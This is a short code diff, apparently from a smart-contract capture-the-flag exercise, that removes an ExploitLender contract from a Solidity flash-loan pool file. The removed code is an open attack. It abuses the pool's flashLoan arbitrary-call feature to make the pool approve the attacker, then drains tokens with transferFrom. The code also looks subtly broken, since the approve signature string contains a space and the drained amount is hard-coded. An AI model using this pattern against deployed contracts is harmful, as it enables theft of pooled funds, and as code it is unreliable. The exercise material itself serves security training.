@@ -38,20 +38,3 @@ contract TrusterLenderPool is ReentrancyGuard {
         );
     }
 }
-
-contract ExploitLender {
-    function exploit(address _pool, address _token) public {
-        TrusterLenderPool pool = TrusterLenderPool(_pool);
-        IERC20 token = IERC20(_token);
-
-        bytes memory data = abi.encodeWithSignature(
-            "approve(address, uint256)",
-            address(this),
-            token.balanceOf(_pool)
-        );
-
-        pool.flashLoan(0, msg.sender, _token, data);
-
-        token.transferFrom(_pool, address(this), 1000000);
-    }
-}
